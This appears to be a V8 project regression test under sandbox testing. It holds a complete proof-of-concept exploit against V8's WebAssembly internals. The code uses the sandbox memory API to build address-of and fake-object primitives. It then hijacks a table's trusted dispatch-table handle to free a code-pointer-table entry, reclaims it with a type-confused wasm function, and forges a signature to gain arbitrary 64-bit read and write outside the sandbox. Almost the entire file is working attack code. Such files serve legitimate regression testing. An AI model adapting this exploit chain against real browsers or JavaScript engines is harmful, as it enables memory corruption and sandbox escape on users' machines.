// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// main exploit

const kHeapObjectTag = 1;
const kWeakHeapObjectTag = 3;

const kWasmTableObjectMaximumLengthOffset = 0x14;
const kWasmTableObjectTrustedDispatchTableOffset = 0x1c;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// Note: we do not insert weak tag.
function addrof(obj, tagged = false) {
  let ofs = Sandbox.getAddressOf(obj);
  return tagged ? (ofs | kHeapObjectTag) : (ofs & ~kWeakHeapObjectTag);
}
function fakeobj(ofs) {
  return Sandbox.getObjectAt(ofs);
}
for (let bits = 8; bits <= 64; bits *= 2) {
  const read_fn = memory[`get${bits == 64 ? 'Big' : ''}Uint${bits}`].bind(memory);
  globalThis[`caged_read${bits}`] = function (ofs) {
    return read_fn(ofs, true);
  }
  const write_fn = memory[`set${bits == 64 ? 'Big' : ''}Uint${bits}`].bind(memory);
  globalThis[`caged_write${bits}`] = function (ofs, val) {
    return write_fn(ofs, val, true);
  }
}
globalThis.caged_read = globalThis.caged_read32;
globalThis.caged_write = globalThis.caged_write32;
function gc_minor() { // scavenge
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}
function gc_major() { // mark-sweep
  try {
    new ArrayBuffer(0x7fe00000);
  } catch {
  }
}
function str2ascii(str) {
  return str.split('').map(char => char.charCodeAt(0));
}
// modified from https://stackoverflow.com/a/14163193
function inject_indexOfMulti() {
  for (const TypedArray of [Uint8Array, Uint16Array, Uint32Array, BigUint64Array]) {
    TypedArray.prototype.indexOfMulti = function(searchElements, fromIndex) {
      fromIndex = fromIndex || 0;

      for (;;) {
        let index = Array.prototype.indexOf.call(this, searchElements[0], fromIndex);
        if (searchElements.length === 1 || index === -1) {
          // Not found or no other elements to check
          return index;
        }

        let i, j, fail = false;
        for (i = index + 1, j = 1; j < searchElements.length && i < this.length; i++, j++) {
          if (this[i] !== searchElements[j]) {
            fromIndex = index + 1;
            fail = true;
            break;
          }
        }
        if (fail) continue;

        return (i === index + searchElements.length) ? index : -1;
      }
    };
  }
}; inject_indexOfMulti();

gc_major();

// fill in any gc gaps & alloc marker 0
// these markers are for EPT stride computation
let dummy_tables = Array(0x100).fill().map(()=>new WebAssembly.Table({initial: 1, maximum: 1, element: 'anyfunc'}));
let dummy_table0 = new WebAssembly.Table({initial: 1, maximum: 1, element: 'anyfunc'});

// instantiate wasm module
let builder = new WasmModuleBuilder();
let $s = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_ls_ll = builder.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64, wasmRefNullType($s)]));
let $fn = builder.addImport('import', 'fn', $sig_ls_ll);
let $call_fn = builder.addFunction('call_fn', $sig_ls_ll).addBody([
  kExprLocalGet, 0,
  kExprLocalGet, 1,
  kExprCallFunction, $fn,   // indirect call through dispatch_table_for_imports()
]).exportFunc();
let instance = builder.instantiate({import: {fn: ()=>[42n, null]}});
let {call_fn} = instance.exports;

// marker 1 & 2
let dummy_table1 = new WebAssembly.Table({initial: 1, maximum: 1, element: 'anyfunc'});
let dummy_table2 = new WebAssembly.Table({initial: 1, maximum: 1, element: 'anyfunc'});

let h0 = caged_read(addrof(dummy_table0) + kWasmTableObjectTrustedDispatchTableOffset);
let h1 = caged_read(addrof(dummy_table1) + kWasmTableObjectTrustedDispatchTableOffset);
let h2 = caged_read(addrof(dummy_table2) + kWasmTableObjectTrustedDispatchTableOffset);
let h_stride = h2 - h1;
let h_new = (h1 - h0) / h_stride - 1;
console.log(`[*] ExposedTrustedObject handle: stride = 0x${h_stride.toString(16)}, newly created by wasm = 0x${h_new.toString(16)}`);

// transplant table to grow
let tt = new WebAssembly.Table({initial: 0, maximum: 0x10, element: 'anyfunc'});

/// automatic finder
/// 1st hit: dispatch_table0 (= empty_dispatch_table)
/// 2nd hit: dispatch_table_for_imports

// $ for i in {1..60}; do ./d8 --sandbox-testing ./poc.js -- $i; done

// {
//   let target_ofs = Number(arguments[0]);
//   console.log(`[*] using target_ofs = 0x${target_ofs.toString(16)}`);
//   let h_target = h1 - h_stride * target_ofs;
//   caged_write(addrof(tt) + kWasmTableObjectTrustedDispatchTableOffset, h_target);
//   tt.grow(0x10);
//   console.log(`[*] success!!`);
//   readline();
//   throw 'found';
// }

// grow the transplanted table. this also clears out index 0 in the new WasmDispatchTable(Data)
// this drops std::shared_ptr<WasmImportWrapperHandle> refcnt to 0, freeing the entry in WasmCPT
// the original WasmDispatchTable is still very well alive
let target_ofs = 0x5;
console.log(`[*] using target_ofs = 0x${target_ofs.toString(16)}`);
let h_target = h1 - h_stride * target_ofs;
caged_write(addrof(tt) + kWasmTableObjectTrustedDispatchTableOffset, h_target);
tt.grow(0x10);

// reclaim WasmCPT as a type-compatible wasm function
let builder2 = new WasmModuleBuilder();

let $s2 = builder2.addStruct([makeField(kWasmI64, true)]);
let $sig_ls_ll2 = builder2.addType(makeSig([kWasmI64, kWasmI64], [kWasmI64, wasmRefNullType($s2)]));
let $sig_l_l = builder2.addType(makeSig([kWasmI64], [kWasmI64]));
let $sig_v_ll = builder2.addType(makeSig([kWasmI64, kWasmI64], []));
let $mem = builder2.addMemory64(1);

// this will later use forged CanonicalSig on WasmToJSWrapper
let $fn2 = builder2.addImport('import', 'fn2', $sig_ls_ll2);

// this reclaims WasmCPT
let $called_fn = builder2.addFunction('called_fn', $sig_ls_ll2).addBody([
  // called_fn(index, val_or_read_idx)
  // index == -1 => use val_or_read_idx to read
  kExprLocalGet, 0,
  ...wasmI64Const(-1n),
  kExprI64Eq,
  kExprIf, kWasmI64,
    kExprLocalGet, 1,
    kExprI64LoadMem, 1, 0,
  kExprElse,
    kExprLocalGet, 0,
    kExprLocalGet, 1,
    // assuming kTrapHandler, no length check except against memory64 max size
    kExprI64StoreMem, 1, 0,
    ...wasmI64Const(0),
  kExprEnd,
  kExprRefNull, kNullRefCode,
]).exportFunc();

let $read64 = builder2.addFunction('read64', $sig_l_l).addBody([
  kExprLocalGet, 0,
  ...wasmI64Const(0n),
  kExprCallFunction, $fn2,
  kGCPrefix, kExprStructGet, $s2, 0,
  kExprReturn,
]).exportFunc();

let $write64 = builder2.addFunction('write64', $sig_v_ll).addBody([
  kExprLocalGet, 0,
  ...wasmI64Const(0n),
  kExprCallFunction, $fn2,
  kExprLocalGet, 1,
  kGCPrefix, kExprStructSet, $s2, 0,
  kExprReturn,
]).exportFunc();

let instance2 = builder2.instantiate({import: {fn2: (x)=>[0n, x-7n]}});
let {called_fn, read64, write64} = instance2.exports;

// now try calling into called_fn from call_fn
// this uses WasmImportData of fn as WasmTrustedInstanceData of called_fn
// by sheer coincidence, kMemory0StartOffset == kWasmImportDataSigOffset
// => memory0 accesses now target wasm::CanonicalSig

// tier-up compile to avoid LiftoffFrameSetup shenanigans and related trusted instance data access
for (let i = 0; i < 0x100000; i++) {
  called_fn(1n, 2n);
}

function sig_read(ofs) {
  // call_fn -> imported call fn == invalid call to called_fn
  return call_fn(-1n, ofs)[0];
}
function sig_write(ofs, val) {
  call_fn(ofs, val)[0];
}

// CanonicalSig structure:
// return_count_
// parameter_count_
// reps_
// signature_hash_
// index_ => http://crrev.com/c/6895241
// reps_[0:2]
// reps_[2:4]
let ll = sig_read(0x30n);   // ll from params     @ reps_[2:4]
sig_write(0x28n, ll);       // overwrite sl to ll @ reps_[0:2]

write64(0x424242424242n, 0x4343434343434343n);
